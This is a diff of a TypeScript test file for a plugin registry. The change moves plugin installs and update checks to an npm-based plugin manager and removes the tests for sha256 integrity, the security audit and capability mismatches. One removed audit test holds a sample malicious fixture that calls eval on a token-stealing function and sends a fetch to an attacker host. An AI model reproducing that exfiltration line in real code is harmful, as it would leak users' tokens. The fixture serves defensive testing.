@@ -1,6 +1,6 @@
 import { describe, expect, it, vi } from 'vitest'
 import { Context } from 'cordis'
-import { DEFAULT_APP_SETTINGS, sha256Hex, SourceFormatError } from '@BBeBee/protocol'
+import { DEFAULT_APP_SETTINGS, SourceFormatError } from '@BBeBee/protocol'
 import type {
   HttpRequest,
   HttpService,
@@ -9,6 +9,7 @@ import type {
   ImportReport,
   LyricSourceDefinition,
   PluginInfo,
+  PluginUpdateInfo,
   RegistryEntry,
   RegistryIndex,
   RegistryTask,
@@ -19,6 +20,7 @@ import type {
 import { midnightPurpleTheme } from '@BBeBee/ui-tokens'
 import { apply, RegistryPlugin } from './index.js'
 import { REGISTRY_VIEWS } from './views.js'
+import { LOCK_STORE_KEY } from './lock.js'
 
 /* ── fixtures ────────────────────────────────────────────────────────────── */
 
@@ -77,44 +79,6 @@ function makeFailingTheme(id: string): ThemeDefinition {
       text: { ...base.tokens.text, primary: base.tokens.bg.app },
     },
   }
-}
-
-function makePluginInfo(id: string, version: string): PluginInfo {
-  return {
-    id,
-    name: id,
-    displayName: id,
-    version,
-    systemId: 'layer-4',
-    enabled: true,
-    state: 'ACTIVE',
-    waitingFor: [],
-    dependencies: [],
-    dependents: [],
-  }
-}
-
-function makePluginBundle(manifestId: string, version: string): {
-  bytes: Uint8Array
-  files: Record<string, string>
-} {
-  const bundle = {
-    manifest: {
-      id: manifestId,
-      name: manifestId,
-      displayName: 'External Plugin',
-      version,
-      systemId: 'layer-4',
-      moduleId: 'registry',
-      engines: { BBeBee: '^0.1.0' },
-      entry: { main: './index.js' },
-      capabilities: [],
-    },
-    files: {
-      'index.js': 'export const name = "external"\n',
-    },
-  }
-  return { bytes: new TextEncoder().encode(JSON.stringify(bundle)), files: bundle.files }
 }
 
 /* ── mocks ───────────────────────────────────────────────────────────────── */
@@ -209,6 +173,10 @@ interface SetupOptions {
   lyricSources?: LyricSourceDefinition[]
   themes?: ThemeDefinition[]
   plugins?: PluginInfo[]
+  /** Delegate result of plugin-manager.checkUpdates() for plugin update checks. */
+  pluginUpdates?: PluginUpdateInfo[]
+  /** Do not provide the plugin-manager service (tests the unavailable-service error). */
+  omitPluginManager?: boolean
   registryAutoCheck?: boolean
   autoCheckDelayMs?: number
   autoCheckIntervalMs?: number
@@ -250,8 +218,13 @@ function setup(options: SetupOptions = {}) {
 
   const pluginManager = {
     list: vi.fn(() => options.plugins ?? []),
+    installPlugin: vi.fn(async (id: string) => `installed ${id}`),
+    uninstall: vi.fn(async (id: string) => `uninstalled ${id}`),
+    checkUpdates: vi.fn(async () => options.pluginUpdates ?? []),
   }
-  ctx.provide('plugin-manager', pluginManager)
+  if (!options.omitPluginManager) {
+    ctx.provide('plugin-manager', pluginManager)
+  }
 
   const settingsSnapshot = { ...DEFAULT_APP_SETTINGS, registryAutoCheck: options.registryAutoCheck ?? false }
   const settings = {
@@ -489,24 +462,44 @@ describe('checkUpdates', () => {
     expect(updates[0]?.installedVersion).toBe('1.0.0')
   })
 
-  it('matches themes and plugins by id', async () => {
+  it('matches themes by id', async () => {
     const { plugin } = await setupInitialized({
       index: {
         entries: [
           entryOf({ id: 'reg-theme', kind: 'theme', name: 'Registry Theme', version: '2.0.0' }),
-          entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', version: '0.9.0' }),
+          entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External' }),
         ],
       },
       themes: [makePassingTheme('reg-theme', '1.0.0')],
-      plugins: [makePluginInfo('ext-plugin', '0.8.0')],
     })
 
     const updates = await plugin.checkUpdates()
-    expect(updates).toHaveLength(2)
-    const theme = updates.find((update) => update.kind === 'theme')
-    const ext = updates.find((update) => update.kind === 'plugin')
-    expect(theme).toMatchObject({ id: 'reg-theme', installedVersion: '1.0.0', availableVersion: '2.0.0' })
-    expect(ext).toMatchObject({ id: 'ext-plugin', installedVersion: '0.8.0', availableVersion: '0.9.0' })
+    expect(updates).toHaveLength(1)
+    expect(updates[0]).toMatchObject({ kind: 'theme', id: 'reg-theme', installedVersion: '1.0.0', availableVersion: '2.0.0' })
+  })
+
+  it('delegates plugin update checks to the plugin-manager and maps the results', async () => {
+    const { plugin, pluginManager } = await setupInitialized({
+      index: {
+        entries: [
+          entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', npm: '@bbebee/ext-plugin' }),
+          entryOf({ id: 'other-plugin', kind: 'plugin', name: 'Other' }),
+        ],
+      },
+      pluginUpdates: [{ id: 'ext-plugin', installed: '0.8.0', latest: '0.9.0', npm: '@bbebee/ext-plugin' }],
+    })
+
+    const updates = await plugin.checkUpdates()
+    expect(pluginManager.checkUpdates).toHaveBeenCalled()
+    expect(updates).toEqual([
+      {
+        kind: 'plugin',
+        id: 'ext-plugin',
+        name: 'External',
+        installedVersion: '0.8.0',
+        availableVersion: '0.9.0',
+      },
+    ])
   })
 
   it('skips entries without a version', async () => {
@@ -626,18 +619,25 @@ describe('fetchEntryDetails', () => {
     expect(details.allowedHosts).toEqual(['lrclib.net'])
   })
 
-  it('returns the entry itself for a plugin, without fetching', async () => {
+  it('returns the entry itself for a plugin (v2 fields), without fetching', async () => {
     const { plugin } = await setupInitialized({
-      http: { fail: { 'https://cdn.example/ext.json': new Error('must not be fetched') } },
+      http: {
+        fail: { 'https://api.github.com/repos/charlie/plugin/commits/HEAD': new Error('must not be fetched') },
+      },
     })
     const entry = entryOf({
       id: 'ext-plugin',
       kind: 'plugin',
       name: 'External',
-      capabilities: ['net:host/*'],
+      repoUrl: 'https://github.com/charlie/plugin',
+      npm: '@bbebee/ext-plugin',
+      services: ['http'],
+      platforms: ['desktop'],
     })
     const details = await plugin.fetchEntryDetails(entry)
     expect(details.entry).toEqual(entry)
+    expect(details.repoUrl).toBe('https://github.com/charlie/plugin')
+    expect(details.securityAudit).toBeUndefined()
     expect(details.allowedHosts).toBeUndefined()
   })
 })
@@ -753,60 +753,28 @@ describe('install', () => {
     )
   })
 
-  it('refuses a plugin bundle whose sha256 does not match', async () => {
-    const url = 'https://cdn.example/ext-plugin.json'
-    const { bytes } = makePluginBundle('ext-plugin', '1.0.0')
-    const harness = await setupInitialized({
-      http: { bytes: { [url]: bytes } },
-    })
-
-    await expect(
-      harness.plugin.install(
-        entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url, sha256: '0'.repeat(64) }),
-      ),
-    ).rejects.toThrow(/failed the integrity check/)
-  })
-
-  it('refuses to install a plugin entry that publishes no digest', async () => {
-    const url = 'https://cdn.example/ext-plugin.json'
-    const { bytes } = makePluginBundle('ext-plugin', '1.0.0')
-    const { plugin } = await setupInitialized({ http: { bytes: { [url]: bytes } } })
-
-    await expect(
-      plugin.install(entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url })),
-    ).rejects.toThrow(/no sha256 digest/)
-  })
-
-  it('calls the installer bridge for a bundle whose sha256 matches', async () => {
-    const url = 'https://cdn.example/ext-plugin.json'
-    const { bytes, files } = makePluginBundle('ext-plugin', '1.0.0')
-    const harness = await setupInitialized({
-      http: { bytes: { [url]: bytes } },
-    })
-    const installer = vi.fn(async () => {})
-    harness.plugin.setPluginInstaller(installer)
-
+  it('delegates a plugin install to plugin-manager.installPlugin and writes no registry lock record', async () => {
+    const harness = await setupInitialized()
     await harness.plugin.install(
-      entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url, sha256: sha256Hex(bytes) }),
+      entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', npm: '@bbebee/ext-plugin', services: ['http'] }),
     )
-    expect(installer).toHaveBeenCalledWith({
-      manifest: expect.objectContaining({ id: 'ext-plugin' }),
-      files,
-    })
+    expect(harness.pluginManager.installPlugin).toHaveBeenCalledWith('ext-plugin')
+    expect(await harness.plugin.getLockRecord('ext-plugin')).toBeUndefined()
   })
 
-  it('refuses a plugin install when no installer bridge is set (mobile)', async () => {
-    const url = 'https://cdn.example/ext-plugin.json'
-    const { bytes } = makePluginBundle('ext-plugin', '1.0.0')
-    const harness = await setupInitialized({
-      http: { bytes: { [url]: bytes } },
-    })
-
+  it('surfaces a plugin-manager install failure', async () => {
+    const harness = await setupInitialized()
+    harness.pluginManager.installPlugin.mockRejectedValueOnce(new Error('npm: install failed: ETARGET'))
     await expect(
-      harness.plugin.install(
-        entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', downloadUrl: url, sha256: sha256Hex(bytes) }),
-      ),
-    ).rejects.toThrow(/only supported on desktop/)
+      harness.plugin.install(entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', npm: '@bbebee/ext-plugin' })),
+    ).rejects.toThrow(/ETARGET/)
+  })
+
+  it('refuses a plugin install with guidance when the plugin-manager is unavailable', async () => {
+    const harness = await setupInitialized({ omitPluginManager: true })
+    await expect(
+      harness.plugin.install(entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', npm: '@bbebee/ext-plugin' })),
+    ).rejects.toThrow(/Settings → Plugin Market/)
   })
 
   it('refuses an entry without a downloadUrl', async () => {
@@ -839,7 +807,9 @@ describe('author repository artifact chain and security audit (Group 5)', () => 
       id: 'plugin-api',
       kind: 'plugin',
       name: 'API Plugin',
-      version: '2.0.0',
+      npm: '@bbebee/plugin-api',
+      services: ['http'],
+      platforms: ['desktop'],
       repoUrl: 'https://github.com/charlie/plugin',
     }
     const themeItem = {
@@ -881,174 +851,48 @@ describe('author repository artifact chain and security audit (Group 5)', () => 
       'plugin-api',
       'theme-api',
     ])
+    // Schema v2 plugin fields survive sanitization.
+    const pluginEntry = index.entries.find((e) => e.id === 'plugin-api')
+    expect(pluginEntry?.npm).toBe('@bbebee/plugin-api')
+    expect(pluginEntry?.services).toEqual(['http'])
+    expect(pluginEntry?.platforms).toEqual(['desktop'])
   })
 
-  it('blocks installation when security audit discovers malicious code (eval + undeclared host)', async () => {
-    const harness = await setupInitialized({
-      http: {
-        json: {
-          'https://api.github.com/repos/evil-author/bad-plugin/commits/HEAD': {
-            sha: 'evil1234567890',
-          },
-          'https://raw.githubusercontent.com/evil-author/bad-plugin/evil1234567890/manifest.json': {
-            id: 'bad-plugin',
-            version: '1.0.0',
-            displayName: 'Bad Plugin',
-            entry: { main: './index.js' },
-            capabilities: ['net:host/*'],
-          },
-        },
-        bytes: {
-          'https://raw.githubusercontent.com/evil-author/bad-plugin/evil1234567890/index.js': new TextEncoder().encode(
-            'eval("stealToken()"); fetch("https://evil.ru/leak");',
-          ),
-        },
-      },
-    })
-
-    const entry = entryOf({
-      id: 'bad-plugin',
-      kind: 'plugin',
-      name: 'Bad Plugin',
-      repoUrl: 'https://github.com/evil-author/bad-plugin',
-      capabilities: ['net:host/*'],
-    })
-
-    await expect(harness.plugin.install(entry)).rejects.toThrow(/security audit blocked installation/)
-  })
-
-  it('rejects installation when plugin capabilities in manifest do not match registry metadata', async () => {
-    const harness = await setupInitialized({
-      http: {
-        json: {
-          'https://api.github.com/repos/mismatch-author/ext-plugin/commits/HEAD': {
-            sha: 'commit111',
-          },
-          'https://raw.githubusercontent.com/mismatch-author/ext-plugin/commit111/manifest.json': {
-            id: 'ext-plugin',
-            version: '1.0.0',
-            displayName: 'Ext Plugin',
-            entry: { main: './index.js' },
-            capabilities: ['net:host/*', 'device:bluetooth'],
-          },
-        },
-        bytes: {
-          'https://raw.githubusercontent.com/mismatch-author/ext-plugin/commit111/index.js': new TextEncoder().encode(
-            'export default function() {}',
-          ),
-        },
-      },
-    })
-
-    const entry = entryOf({
-      id: 'ext-plugin',
-      kind: 'plugin',
-      name: 'Ext Plugin',
-      repoUrl: 'https://github.com/mismatch-author/ext-plugin',
-      capabilities: ['net:host/*'],
-    })
-
-    await expect(harness.plugin.install(entry)).rejects.toThrow(
-      /capabilities mismatch between manifest and registry metadata/,
+  it('installs a plugin without fetching the author repository (npm delegation)', async () => {
+    // No http routes at all: any author-repo fetch would throw "no route".
+    const harness = await setupInitialized({ http: { json: {} } })
+    await harness.plugin.install(
+      entryOf({ id: 'bad-plugin', kind: 'plugin', name: 'Bad Plugin', repoUrl: 'https://github.com/evil-author/bad-plugin', npm: '@evil/bad-plugin' }),
     )
+    expect(harness.pluginManager.installPlugin).toHaveBeenCalledWith('bad-plugin')
   })
 
-  it('rejects with clear error when author repository is unreachable / 404', async () => {
-    const harness = await setupInitialized({
-      http: {
-        status: {
-          'https://api.github.com/repos/unknown-author/missing-repo/commits/HEAD': 404,
-          'https://api.github.com/repos/unknown-author/missing-repo': 404,
+  it('keeps historical plugin lock records readable while new installs write none', async () => {
+    const harness = await setupInitialized()
+    // A record written by the retired GitHub-bundle flow.
+    harness.data.set(LOCK_STORE_KEY, {
+      version: 1,
+      records: {
+        'legacy-plugin': {
+          id: 'legacy-plugin',
+          kind: 'plugin',
+          repo: 'https://github.com/good-author/safe-plugin',
+          commit: 'commit-v1-sha',
+          sha256: 'abc123',
+          installedAt: 123,
         },
       },
     })
 
-    const entry = entryOf({
-      id: 'missing-plugin',
-      kind: 'plugin',
-      name: 'Missing Plugin',
-      repoUrl: 'https://github.com/unknown-author/missing-repo',
-    })
+    const record = await harness.plugin.getLockRecord('legacy-plugin')
+    expect(record?.kind).toBe('plugin')
+    expect(record?.commit).toBe('commit-v1-sha')
 
-    await expect(harness.plugin.install(entry)).rejects.toThrow(/failed to resolve author repository/)
-  })
-
-  it('records into registry.lock.json and updates lock record on commit advance', async () => {
-    let installedBundle: any
-    const httpSpec = {
-      json: {
-        'https://api.github.com/repos/good-author/safe-plugin/commits/HEAD': {
-          sha: 'commit-v1-sha',
-        },
-        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v1-sha/manifest.json': {
-          id: 'safe-plugin',
-          version: '1.0.0',
-          displayName: 'Safe Plugin',
-          entry: { main: './index.js' },
-          capabilities: ['audio:dsp'],
-        },
-        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v2-sha/manifest.json': {
-          id: 'safe-plugin',
-          version: '1.1.0',
-          displayName: 'Safe Plugin',
-          entry: { main: './index.js' },
-          capabilities: ['audio:dsp'],
-        },
-      },
-      bytes: {
-        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v1-sha/index.js': new TextEncoder().encode(
-          'export default function safePlugin() { return "v1"; }',
-        ),
-        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v2-sha/index.js': new TextEncoder().encode(
-          'export default function safePlugin() { return "v2"; }',
-        ),
-      },
-    }
-
-    const harness = await setupInitialized({ http: httpSpec })
-
-    harness.plugin.setPluginInstaller(async (bundle) => {
-      installedBundle = bundle
-    })
-
-    const entry = entryOf({
-      id: 'safe-plugin',
-      kind: 'plugin',
-      name: 'Safe Plugin',
-      repoUrl: 'https://github.com/good-author/safe-plugin',
-      capabilities: ['audio:dsp'],
-    })
-
-    // 1. Initial install
-    await harness.plugin.install(entry)
-    expect(installedBundle).toBeDefined()
-    expect(installedBundle.manifest.id).toBe('safe-plugin')
-
-    const lock1 = await harness.plugin.getLockRecord('safe-plugin')
-    expect(lock1).toBeDefined()
-    expect(lock1?.commit).toBe('commit-v1-sha')
-    expect(lock1?.kind).toBe('plugin')
-    expect(lock1?.sha256).toBe(sha256Hex('export default function safePlugin() { return "v1"; }'))
-
-    // 2. Fetch entry details surfaces commit
-    const details = await harness.plugin.fetchEntryDetails(entry)
-    expect(details.commit).toBe('commit-v1-sha')
-
-    // 3. Update with new commit
-    httpSpec.json['https://api.github.com/repos/good-author/safe-plugin/commits/HEAD'] = {
-      sha: 'commit-v2-sha',
-    }
-
-    const detailsV2 = await harness.plugin.fetchEntryDetails(entry)
-    expect(detailsV2.commitDiff).toEqual({
-      previousCommit: 'commit-v1-sha',
-      currentCommit: 'commit-v2-sha',
-    })
-
-    await harness.plugin.install(entry)
-    const lock2 = await harness.plugin.getLockRecord('safe-plugin')
-    expect(lock2?.commit).toBe('commit-v2-sha')
-    expect(lock2?.sha256).toBe(sha256Hex('export default function safePlugin() { return "v2"; }'))
+    await harness.plugin.install(
+      entryOf({ id: 'ext-plugin', kind: 'plugin', name: 'External', npm: '@bbebee/ext-plugin' }),
+    )
+    expect(harness.pluginManager.installPlugin).toHaveBeenCalledWith('ext-plugin')
+    expect(await harness.plugin.getLockRecord('ext-plugin')).toBeUndefined()
   })
 })
 
